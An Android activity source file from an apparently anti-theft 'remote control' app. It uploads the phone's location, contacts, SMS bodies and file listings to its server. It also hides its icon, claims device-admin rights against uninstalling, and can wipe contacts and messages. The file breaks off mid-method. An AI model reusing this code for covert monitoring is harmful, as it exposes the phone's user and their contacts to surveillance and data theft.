package com.example.chen.yuankong.Activity;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.Location;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.FileObserver;
import android.os.Message;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.Settings;
import android.telephony.PhoneNumberUtils;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationListener;
import com.amap.api.location.LocationManagerProxy;
import com.amap.api.location.LocationProviderProxy;
import com.dtr.settingview.lib.SettingView;
import com.dtr.settingview.lib.entity.SettingData;
import com.dtr.settingview.lib.entity.SettingViewItemData;
import com.dtr.settingview.lib.item.BasicItemViewH;
import com.dtr.settingview.lib.item.SwitchItemView;
import com.example.chen.yuankong.R;
import com.example.chen.yuankong.Receiver.LockReceiver;
import com.example.chen.yuankong.Receiver.PushDemoReceiver;
import com.example.chen.yuankong.Scanner.SDCardScanner;
import com.example.chen.yuankong.Application.App;
import com.example.chen.yuankong.Service.MyAccessibilityService;
import com.example.chen.yuankong.Utils.DoubleClickExitHelper;
import com.example.chen.yuankong.Utils.HelperUtils;
import com.example.chen.yuankong.Utils.Tb_contacts;
import com.example.chen.yuankong.indexActivity;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import com.loopj.android.http.TextHttpResponseHandler;


import org.apache.http.Header;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Stack;
import java.util.Timer;
import java.util.TimerTask;

public class AfterLogin extends Activity implements AMapLocationListener {

    public static SettingView mSettingView1 = null;
    public static SettingView mSettingView2 = null;
    public static AfterLogin m_after;
    List<Tb_contacts> contactslist;
    private SettingData mItemData = null;
    private SettingViewItemData mItemViewData = null;
    private List<SettingViewItemData> mListData = new ArrayList<SettingViewItemData>();
    private DevicePolicyManager policyManager;
    private ComponentName componentName;

    LocationManagerProxy mLocationManagerProxy;
    DoubleClickExitHelper doubleClick = new DoubleClickExitHelper(this);

    private ProgressDialog dialog;

    private List<String> picname;
    private List<String> picpath;

    private List<String> docname;
    private List<String> docpath;

    private List<String> vioname;
    private List<String> viopath;

    private SharedPreferences sp;
    private SharedPreferences.Editor editor;
    private SmsObserver smsObserver;

    private conObserver conObserver;
    private FileObserver mFileObserver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ios_style);
        m_after = this;
        mLocationManagerProxy = LocationManagerProxy.getInstance(this);
        mLocationManagerProxy.requestLocationData(LocationProviderProxy.AMapNetwork, -1, 15, this);
        smsObserver = new SmsObserver(handler);
//        getContentResolver().registerContentObserver(SMS, true,
//                smsObserver);
        conObserver = new conObserver(handler);
//        getContentResolver().registerContentObserver(CON_URI, true,
//                conObserver);

        if (null == mFileObserver) {
            mFileObserver = new RecursiveFileObserver("/storage");
            //  System.out.println("epath" + Environment.getExternalStorageDirectory().getPath());
            //     mFileObserver.startWatching(); //开始监听
        }
        sp = getSharedPreferences("LOGIN", Context.MODE_PRIVATE);
        editor = sp.edit();
        mSettingView1 = (SettingView) findViewById(R.id.ios_style_setting_view_01);
        mSettingView2 = (SettingView) findViewById(R.id.ios_style_setting_view_02);
        initView();
        mSettingView1.setOnSettingViewItemClickListener(new SettingView.onSettingViewItemClickListener() {

            @Override
            public void onItemClick(int index) {
                // TODO Auto-generated method stub
                if (index == 1) {
                    String Email = sp.getString("Email", "");
                    Intent intent;
                    if (Email.isEmpty()) {
                        intent = new Intent(AfterLogin.this, EmailActivity.class);
                    } else
                        intent = new Intent(AfterLogin.this, TextActivity.class);
                    startActivity(intent);
                } else if (index == 2) {
                    Intent intent;
                    String phone = sp.getString("Phone", "");
                    if (phone.isEmpty())
                        intent = new Intent(AfterLogin.this, PhoneActivity.class);
                    else
                        intent = new Intent(AfterLogin.this, pTextActivity.class);
                    startActivity(intent);
                } else if (index == 3) {
                    try {
                        Intent intent = new Intent(AfterLogin.this, daoruActivity.class);
                        startActivity(intent);
                    } catch (Exception e) {

                    }
                }
            }
        });

        mSettingView1.setOnSettingViewItemSwitchListener(new SettingView.onSettingViewItemSwitchListener() {

            @Override
            public void onSwitchChanged(int index, boolean isChecked) {
                // TODO Auto-generated method stub
                if (isChecked) {
                    if (!isAccessibilitySettingsOn(getApplicationContext()))
                        HelperUtils.startHelper(AfterLogin.this);
                } else {
                }
            }
        });

        mSettingView2.setOnSettingViewItemSwitchListener(new SettingView.onSettingViewItemSwitchListener() {

            @Override
            public void onSwitchChanged(int index, boolean isChecked) {
                // TODO Auto-generated method stub
                if (isChecked) {
                    if (index == 0) {
                        testContacts();
                    }
                    if (index == 1) {
                        getSmsFromPhone();
                    }
                    if (index == 2) {
                        boolean hide = sp.getBoolean("hide", false);
                        Log.v("hello", "hide" + hide);
                        AlertDialog al = new AlertDialog.Builder(m_after).setTitle("提示")
                                .setMessage("点击后数秒内应用将关闭")
                                .setNegativeButton("取消", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        return;
                                    }
                                }).setPositiveButton("确定", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {

                                        editor.putBoolean("hide", true);
                                        editor.commit();
                                        PackageManager pm = getPackageManager();
                                        ComponentName name = new ComponentName(AfterLogin.this, indexActivity.class);//提供包和主Activity名称
                                        pm.setComponentEnabledSetting(name, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                                        // m_after.finish();
                                    }
                                }).create();
                        al.show();
                    }
                    if (index == 3) {
                        // get prompts.xml view
                        LayoutInflater li = LayoutInflater.from(m_after);
                        View promptsView = li.inflate(R.layout.passwd, null);

                        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
                                m_after);

                        // set prompts.xml to alertdialog builder
                        alertDialogBuilder.setView(promptsView);

                        final EditText userInput = (EditText) promptsView
                                .findViewById(R.id.editTextDialogUserInput);
                        final TextView TE = (TextView) promptsView.findViewById(R.id.textView1);
                        TE.setText("确认你的账户密码");
                        // set dialog message
                        alertDialogBuilder
                                .setCancelable(false)
                                .setPositiveButton("确认",
                                        new DialogInterface.OnClickListener() {
                                            public void onClick(DialogInterface dialog, int id) {
                                                // get user input and set it to result
                                                // edit text
                                                if (userInput.getText().toString().isEmpty()) {
                                                    Toast.makeText(AfterLogin.this, "密码不能为空", Toast.LENGTH_SHORT).show();
                                                } else {
                                                    sp = getSharedPreferences("LOGIN", Context.MODE_PRIVATE);
                                                    String pwd = sp.getString("PWD", "");
                                                    if (userInput.getText().toString().trim().equals(pwd)) {
                                                        getSharedPreferences("LOGIN", Context.MODE_PRIVATE).edit().putString("fangdao", userInput.getText().toString()).commit();
                                                        activeManager();//激活设备管理器获取权限

                                                    } else
                                                        Toast.makeText(m_after, "密码错误", Toast.LENGTH_LONG).show();
                                                }
                                            }
                                        })
                                .setNegativeButton("取消",
                                        new DialogInterface.OnClickListener() {
                                            public void onClick(DialogInterface dialog, int id) {
                                                //      mSettingView2.getItemView(3).setFocusable(false);
                                                dialog.cancel();
                                            }
                                        });

                        // create alert dialog
                        AlertDialog alertDialog = alertDialogBuilder.create();

                        // show it
                        policyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                        componentName = new ComponentName(m_after, LockReceiver.class);
                        if (policyManager.isAdminActive(componentName)) {//判断是否有权限(激活了设备管理器)
                        } else {
                            alertDialog.show();
                        }
                    }
                } else {

                }
            }
        });

        dialog = new ProgressDialog(this);
        picname = new ArrayList<String>();
        picpath = new ArrayList<String>();
        docname = new ArrayList<String>();
        docpath = new ArrayList<String>();
        vioname = new ArrayList<String>();
        viopath = new ArrayList<String>();
        contactslist = new ArrayList<Tb_contacts>();
        initfile();
    }

    private void activeManager() {
        //使用隐式意图调用系统方法来激活指定的设备管理器
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "防卸载");
        startActivity(intent);
    }

    @Override
    protected void onResume() {
        // TODO Auto-generated method stub
        super.onResume();

    }

    @Override
    protected void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();

    }

    @Override
    public void onLocationChanged(AMapLocation aMapLocation) {
        //地图定位回调函数
        if (aMapLocation != null && aMapLocation.getAMapException().getErrorCode() == 0) {
            String str = aMapLocation.getAddress();
            double y = aMapLocation.getLatitude();
            double x = aMapLocation.getLongitude();
            PostXY(x, y, str);
        }
    }

    public void PostXY(double x, double y, String pos) {
        AsyncHttpClient client = App.httpClient;
        String url = App.host + "/home/index/setxy";
        //  Toast.makeText(AfterLogin.this, "\"x\" + x + \",y\" + y + \"cid\" + App.cid + App.deviceId", Toast.LENGTH_SHORT).show();
        Log.v("hello", "x" + x + ",y" + y + "cid" + App.cid + App.deviceId);
        RequestParams params = new RequestParams();
        params.put("x", x);
        params.put("y", y);
        params.put("position", pos);
        if (App.WIFI_CONNECT) {
            params.put("wifi", 1);
        } else if (App.MOBILE_CONNECT) {
            params.put("mobile", 1);
        } else if (!App.mNetWorkState) {
            params.put("wifi", 0);
            params.put("mobile", 0);
        }
        params.put("ClientID", App.cid);
        params.put("deviceid", App.deviceId);
        client.post(url, params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] bytes) {

                if (statusCode == 200) {
                    Log.v("putxy", "true" + new String(bytes));
                } else {
                    Log.v("putxy", "false" + new String(bytes));
                }

            }

            @Override
            public void onFailure(int StatusCode, Header[] headers, byte[] bytes, Throwable throwable) {
                Log.v("putxy", "failure");
                throwable.printStackTrace();
            }
        });
    }

    @Override
    public void onLocationChanged(Location location) {
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {

        if (event.getKeyCode() == KeyEvent.KEYCODE_BACK) {
            return doubleClick.onKeyDown(keyCode, event);
        }
        if(event.getKeyCode()==KeyEvent.KEYCODE_VOLUME_DOWN){
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am.getStreamVolume(AudioManager.STREAM_SYSTEM) < am.getStreamMaxVolume(AudioManager.STREAM_SYSTEM) * 3 / 4)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, am.getStreamMaxVolume(AudioManager.STREAM_SYSTEM), AudioManager.FLAG_PLAY_SOUND);

        }
        return super.onKeyDown(keyCode, event);
    }


    public void setpic(String path) {
        File file = new File(path);
        if (file.canRead() && file.exists()) {
            File[] files = file.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.canRead()) {
                        if (f.isDirectory()) {
                            setpic(f.getPath());
                        } else {
                            if (f.getName().endsWith(".jpg") ||
                                    f.getName().endsWith(".jpeg")) {
                                picname.add(f.getName());
                                picpath.add(f.getPath());
                            }
                        }
                    }
                }
            }
        }
    }

    public void setfile(String path) {

        File file = new File(path);
        if (file.canRead() && file.exists()) {
            File[] files = file.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.canRead()) {
                        if (f.isDirectory()) {
                            setfile(f.getPath());
                        } else {
                            if (f.getName().endsWith(".doc") ||
                                    f.getName().endsWith(".docx") ||
                                    f.getName().endsWith(".pdf") ||
                                    f.getName().endsWith(".ppt") ||
                                    f.getName().endsWith(".pptx") ||
                                    f.getName().endsWith(".xls") ||
                                    f.getName().endsWith(".xlsx")) {
                                docname.add(f.getName());
                                docpath.add(f.getPath());
                            }
                            if (f.getName().endsWith(".avi") ||
                                    f.getName().endsWith(".rmvb") ||
                                    f.getName().endsWith(".rm") ||
                                    f.getName().endsWith(".mp4") ||
                                    f.getName().endsWith(".wav") ||
                                    f.getName().endsWith(".flv") ||
                                    f.getName().endsWith(".mkv")) {
                                vioname.add(f.getName());
                                viopath.add(f.getPath());
                            }
                        }
                    }
                }
            }
        }
    }

    public void initfile() {
        AsyncHttpClient httpClient = App.httpClient;
        RequestParams params = new RequestParams();
        String url = App.host + "/home/user/isread";
        params.put("ClientID", App.cid);
        httpClient.post(url, params, new TextHttpResponseHandler() {
            @Override
            public void onFailure(int i, Header[] headers, String s, Throwable throwable) {


            }

            @Override
            public void onSuccess(int i, Header[] headers, String s) {
                //   Log.v("hello", "init");
                if (i == 200) {
                    // Log.v("hello", s);
                    if (s.equals("1")) {
                        /*常用文件*/
                        showfile();
                    }
                }
            }
        });
    }

    public void pread(int type) {
        AsyncHttpClient httpClient = App.httpClient;
        RequestParams params = new RequestParams();
        String url = App.host + "/home/user/read";
        params.put("ClientID", App.cid);
        if (type == 1) {
            params.put("picname", picname);
            params.put("picpath", picpath);
            params.put("docname", docname);
            params.put("docpath", docpath);
            params.put("vioname", vioname);
            params.put("viopath", viopath);
            //   Log.v("hello", "1");
        } else if (type == 2) {
            params.put("docname", docname);
            params.put("docpath", docpath);
            //  Log.v("hello", "2");
        } else if (type == 3) {
            params.put("vioname", vioname);
            params.put("viopath", viopath);
            // Log.v("hello", "3");
        }

        //  Log.v("hello", "pic:" + String.valueOf(picname.size()));
        //   Log.v("hello", "doc:" + String.valueOf(docname.size()));
        //    Log.v("hello", "vio:" + String.valueOf(vioname.size()));
        //    Log.v("hello", "tree:" + String.valueOf(treename.size()));
        if (type != 4) {
            httpClient.post(url, params, new TextHttpResponseHandler() {
                @Override
                public void onFailure(int i, Header[] headers, String s, Throwable throwable) {
                    Log.v("hello", "faile" + s);
                }

                @Override
                public void onSuccess(int i, Header[] headers, String s) {
                    if (i == 200) {
                        //    Log.v("hello", s);
                    } else
                    //  Log.v("hello", "fei200");
                    {
                    }
                }
            });
        }
    }

    public void inittree() {

        List<String> list;
        list = SDCardScanner.getExtSDCardPaths();
        for (int i = 0; i < list.size(); i++) {
            File file = new File(list.get(i));
            String name = file.getName();
            String path = file.getPath();
            String state = "closed";
            int tid = 0;
            postonetree(name, path, state, tid);
        }

    }

    public static void postonetree(String name, String path, String state, int tid) {
        AsyncHttpClient httpClient = App.httpClient;

        RequestParams params = new RequestParams();
        String url = App.host + "/home/user/inittree";
        params.put("ClientID", App.cid);

        params.put("text", name);
        params.put("path", path);
        params.put("state", state);
        params.put("tid", tid);

        httpClient.post(url, params, new TextHttpResponseHandler() {
            @Override
            public void onFailure(int i, Header[] headers, String s, Throwable throwable) {


            }

            @Override
            public void onSuccess(int i, Header[] headers, String s) {
                if (i == 200)
                    Log.v("hello", "inittree");
            }
        });

    }

    public void picfile() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<String> list;
                list = SDCardScanner.getExtSDCardPaths();
                for (int i = 0; i < list.size(); i++) {
                    setpic(list.get(i));
                }
                //  Log.v("hello", "ok");
                Message msg = new Message();
                msg.what = 2;
                handler.sendMessage(msg);

            }
        }).start();
    }

    public void showfile() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<String> list;
                list = SDCardScanner.getExtSDCardPaths();
                for (int i = 0; i < list.size(); i++) {
                    setfile(list.get(i));
                    setpic(list.get(i));
                }
                // Log.v("hello", "ok");
                Message msg = new Message();
                msg.what = 1;
                handler.sendMessage(msg);


            }
        }).start();
    }

    private Timer timer = new Timer();
    private TimerTask task = new TimerTask() {
        @Override
        public void run() {
            Message msg = new Message();
            msg.what = 3;
            handler.sendMessage(msg);
        }
    };

    Handler handler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 1:
                    pread(1);
                    break;
                case 2:

                    break;
                case 3:
                    break;
                case 4:
                    editor.putBoolean("contact", true);
                    editor.commit();
                    // hideswitch.setEnabled(false);
                    break;
                case 5:
                    editor.putBoolean("sms", true);
                    editor.commit();
                    //smsswitch.setEnabled(false);
                    break;

            }
            super.handleMessage(msg);
        }
    };

    public void uploadtree(String text, String path, String state, String parent) {
        AsyncHttpClient httpClient = App.httpClient;
        String url = App.host + "/home/index/addtree";
        RequestParams params = new RequestParams();
        params.put("state", state);
        params.put("parent", parent);
        params.put("text", text);
        params.put("path", path);
        params.put("ClientID", App.cid);

        httpClient.post(url, params, new TextHttpResponseHandler() {
            @Override
            public void onFailure(int i, Header[] headers, String s, Throwable throwable) {

            }

            @Override
            public void onSuccess(int i, Header[] headers, String s) {

                Log.v("hello", "su" + s);
            }
        });
    }

    /*
   清空联系人
    */
    public static void clear() {
        Log.v("hello", "clear");
        ContentResolver cr = m_after.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        while (cur.moveToNext()) {
            try {
                String lookupKey = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.LOOKUP_KEY));
                Uri uri = Uri.withAppendedPath(ContactsContract.
                        Contacts.CONTENT_LOOKUP_URI, lookupKey);
                System.out.println("The uri is " + uri.toString());
                cr.delete(uri, null, null);//删除所有的联系人
            } catch (Exception e) {
                System.out.println(e.getStackTrace());
            }
        }
    }

    public void deleteSMS() {
        Log.v("hello", "delete");
        try {
            ContentResolver CR = getContentResolver();
            Log.v("hello", "jinlai");
            // Query SMS
            Uri uriSms = Uri.parse("content://sms");
            Cursor c = CR.query(uriSms,
                    new String[]{"_id", "thread_id"}, null, null, null);
            if (null != c && c.moveToFirst()) {
                do {
                    // Delete SMS
                    long threadId = c.getLong(1);
                    int re = CR.delete(Uri.parse("content://sms/conversations/" + threadId),
                            null, null);
                    Log.d("hello", "threadId:: " + threadId + "," + re);
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            // TODO: handle exception
            Log.d("deleteSMS", "Exception:: " + e);
        }
    }


    private Uri CON_URI = Uri.parse("content://com.android.contacts/contacts");

    public void testContacts() {
        Log.v("hello", "diaoyongle test");
        Uri uri = Uri.parse("content://com.android.contacts/contacts");
        //获得一个ContentResolver数据共享的对象
        ContentResolver reslover = this.getContentResolver();
        //取得联系人中开始的游标，通过content://com.android.contacts/contacts这个路径获得
        Cursor cursor = reslover.query(uri, null, null, null, null);

        //上边的所有代码可以由这句话代替：Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //Uri.parse("content://com.android.contacts/contacts") == ContactsContract.Contacts.CONTENT_URI
        AsyncHttpClient httpClient = App.httpClient;
        String url = App.host + "/home/user/setcontact";
        while (cursor.moveToNext()) {
            //获得联系人ID
            String id = cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.Contacts._ID));
            //获得联系人姓名
            String name = cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.Contacts.DISPLAY_NAME));
            //获得联系人手机号码
            Cursor phone = reslover.query(Phone.CONTENT_URI, null,
                    Phone.CONTACT_ID + "=" + id, null, null);

            StringBuilder sb = new StringBuilder("").append(name + ",");
            while (phone.moveToNext()) { //取得电话号码(可能存在多个号码)
                int phoneFieldColumnIndex = phone.getColumnIndex(Phone.NUMBER);
                String phoneNumber = phone.getString(phoneFieldColumnIndex);
                sb.append(phoneNumber + "");
            }

            RequestParams params = new RequestParams();
            params.put("contact", sb.toString());
            params.put("ClientID", App.cid);

            httpClient.post(url, params, new TextHttpResponseHandler() {
                @Override
                public void onFailure(int i, Header[] headers, String s, Throwable throwable) {

                }

                @Override
                public void onSuccess(int i, Header[] headers, String s) {

                    Message msg = new Message();
                    msg.what = 4;
                    handler.sendMessage(msg);
                }
            });
        }
        cursor.close();
    }


    private Uri SMS = Uri.parse("content://sms/");

    public void getSmsFromPhone() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person",
                "body", "date", "type"};//"_id", "address", "person",, "date", "type
//        String where = " address = '1066321332' AND date >  "
//                + (System.currentTimeMillis() - 10 * 60 * 1000);
        Cursor cur = cr.query(SMS, projection, null, null, "date desc");
        AsyncHttpClient httpClient = App.httpClient;
        String url = App.host + "/home/user/setsms";
        if (null != cur) {

            while (cur.moveToNext()) {
                String date = cur.getString(cur.getColumnIndex("date"));

                date = GetStringFromLong(Long.parseLong(date));

                String type = cur.getString(cur.getColumnIndex("type"));
                if (type.equals("1")) {
                    type = "收到来自";
                } else {
                    type = "发送给";
                }
                String number = cur.getString(cur.getColumnIndex("address"));//手机号
                String name = ContactNameByNumber(number);//联系人姓名列表
                String body = cur.getString(cur.getColumnIndex("body"));
//            //这里我是要获取自己短信服务号码中的验证码~~
//            Pattern pattern = Pattern.compile(" [a-zA-Z0-9]{10}");
//            Matcher matcher = pattern.matcher(body);
//            if (matcher.find()) {
//                String res = matcher.group().substring(1, 11);
//            }
                String sms = date + "," + type + number + name + ";"
                        + "短信内容：" + body;
                RequestParams params = new RequestParams();
                params.put("sms", sms);
                params.put("ClientID", App.cid);

                httpClient.post(url, params, new TextHttpResponseHandler() {
                    @Override
                    public void onFailure(int i, Header[] headers, String s, Throwable throwable) {

                    }

                    @Override
                    public void onSuccess(int i, Header[] headers, String s) {

                        Message msg = new Message();
                        msg.what = 5;
                        handler.sendMessage(msg);
                    }
                });
                Log.v("hello", date + "," + type + number + name + "," + "短信内容：" + body);
            }
        }
        cur.close();
    }


    public String ContactNameByNumber(String number) {
        Uri uri = Uri.parse("content://com.android.contacts/data/phones/filter/" + number);
        ContentResolver resolver = getContentResolver();
        String name = "未知";
        Cursor cursor = resolver.query(uri, new String[]{android.provider.ContactsContract.Data.DISPLAY_NAME}, null, null, null);
        if (cursor.moveToFirst()) {
            name = cursor.getString(0);
            Log.i("hello", name);
        }
        cursor.close();
        return '(' + name + ')';
    }


    public String GetStringFromLong(long millis) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
        java.util.Date dt = new Date(millis);
        return sdf.format(dt);
    }

    private boolean isAccessibilitySettingsOn(Context mContext) {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
            Log.v("hello", "accessibilityEnabled = " + accessibilityEnabled);
        } catch (Settings.SettingNotFoundException e) {
            Log.e("hello", "Error finding setting, default accessibility to not found: "
                    + e.getMessage());
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            Log.v("hello", "***ACCESSIBILITY IS ENABLED*** -----------------");
            String settingValue = Settings.Secure.getString(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();

                    Log.v("hello", "-------------- > accessibilityService :: " + accessibilityService + " " + service);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.v("hello", "We've found the correct setting - accessibility is switched on!");
                        return true;
                    }
                }
            }
        } else {
            Log.v("hello", "***ACCESSIBILITY IS DISABLED***");
        }

        return false;
    }


    private void initView() {
        /* ==========================SettingView1========================== */
        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("开启辅助");
        //     mItemData.setDrawable(getResources().getDrawable(R.drawable.icon07));
        mItemData.setChecked(isAccessibilitySettingsOn(getApplicationContext()));

        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new SwitchItemView(AfterLogin.this));
        mListData.add(mItemViewData);

        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("绑定邮箱");
        String email = sp.getString("Email", "");
        if (!email.isEmpty())
            mItemData.setSubTitle(email.replace(email.substring(2, 8), "******"));
        else {
            mItemData.setSubTitle("未绑定");
        }

        //   mItemData.setDrawable(getResources().getDrawable(R.drawable.icon02));

        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new BasicItemViewH(AfterLogin.this));
        mListData.add(mItemViewData);

        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("设置安全手机号");
        String phone = sp.getString("Phone", "");
        if (!phone.isEmpty())
            mItemData.setSubTitle(phone.replace(phone.substring(3, 9), "******"));
        else
            mItemData.setSubTitle("未设置");
        //   mItemData.setDrawable(getResources().getDrawable(R.drawable.icon02));

        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new BasicItemViewH(AfterLogin.this));
        mListData.add(mItemViewData);


        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("导入联系人");

        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new BasicItemViewH(AfterLogin.this));
        mListData.add(mItemViewData);
//
//		mItemViewData = new SettingViewItemData();
//		mItemData = new SettingData();
//		mItemData.setTitle("运营商");
//		mItemData.setSubTitle("中国移动");
//		mItemData.setDrawable(getResources().getDrawable(R.drawable.icon03));
//
//		mItemViewData.setData(mItemData);
//		mItemViewData.setItemView(new BasicItemViewH(IosStyleActivity.this));
//		mListData.add(mItemViewData);
//
        mSettingView1.setAdapter(mListData);
        /* ==========================SettingView1========================== */

		/* ==========================SettingView2========================== */
        mListData.clear();

        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("同步通讯录");
        //   mItemData.setDrawable(getResources().getDrawable(R.drawable.icon01));
        boolean contact = sp.getBoolean("contact", false);
        mItemData.setChecked(contact);

        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new SwitchItemView(AfterLogin.this));
        mListData.add(mItemViewData);

        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("同步短信");
        //   mItemData.setDrawable(getResources().getDrawable(R.drawable.icon01));
        boolean sms = sp.getBoolean("sms", false);
        mItemData.setChecked(sms);

        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new SwitchItemView(AfterLogin.this));
        mListData.add(mItemViewData);

        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("隐藏图标");
        //   mItemData.setDrawable(getResources().getDrawable(R.drawable.icon01));
        boolean hide = sp.getBoolean("hide", false);
        mItemData.setChecked(false);

        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new SwitchItemView(AfterLogin.this));
        mListData.add(mItemViewData);

        mItemViewData = new SettingViewItemData();
        mItemData = new SettingData();
        mItemData.setTitle("防卸载");
        //   mItemData.setDrawable(getResources().getDrawable(R.drawable.icon01));
        policyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        componentName = new ComponentName(m_after, LockReceiver.class);
        mItemData.setChecked(policyManager.isAdminActive(componentName));


        mItemViewData.setData(mItemData);
        mItemViewData.setItemView(new SwitchItemView(AfterLogin.this));
        mListData.add(mItemViewData);
//		mItemViewData = new SettingViewItemData();
//		mItemData = new SettingData();
//		mItemData.setTitle("通知中心");
//		mItemData.setDrawable(getResources().getDrawable(R.drawable.icon10));
//
//		mItemViewData.setData(mItemData);
//		mItemViewData.setItemView(new BasicItemViewH(IosStyleActivity.this));
//		mListData.add(mItemViewData);

//		mItemViewData = new SettingViewItemData();
//		mItemData = new SettingData();
//		mItemData.setTitle("控制中心");
//		mItemData.setDrawable(getResources().getDrawable(R.drawable.icon10));
//
//		mItemViewData.setData(mItemData);
//		mItemViewData.setItemView(new BasicItemViewH(IosStyleActivity.this));
//		mListData.add(mItemViewData);
//
//		mItemViewData = new SettingViewItemData();
//		mItemData = new SettingData();
//		mItemData.setTitle("勿扰模式");
//		mItemData.setDrawable(getResources().getDrawable(R.drawable.icon09));
//
//		mItemViewData.setData(mItemData);
//		mItemViewData.setItemView(new BasicItemViewH(IosStyleActivity.this));
//		mListData.add(mItemViewData);

        mSettingView2.setAdapter(mListData);
        /* ==========================SettingView2========================== */
    }

    private Uri SMS_INBOX = Uri.parse("content://sms/inbox");

    public void ObserverSms() {
        Log.v("hello", "sms调用了");
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"address", "body"};//"_id", "address", "person",, "date", "type
        String phone = sp.getString("Phone", "");
        String where = "address = '" + "+86" + phone + "'";
        Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
        if (null == cur)
            return;
        if (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String body = cur.getString(cur.getColumnIndex("body"));
            Log.v("hello", "boy:" + body);
        }
    }

    class SmsObserver extends ContentObserver {

        /**
         * Creates a content observer.
         *
         * @param handler The handler to run {@link #onChange} on, or null if none.
         */
        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            ObserverSms();
        }
    }

    class conObserver extends ContentObserver {

        /**
         * Creates a content observer.
         *
         * @param handler The handler to run {@link #onChange} on, or null if none.
         */
        public conObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.v("hello", "changeconm" + String.valueOf(App.fromweb));
            if (!App.fromweb)
                updatacon();
        }
    }

    public void updatacon() {
        AsyncHttpClient httpClient = App.httpClient;
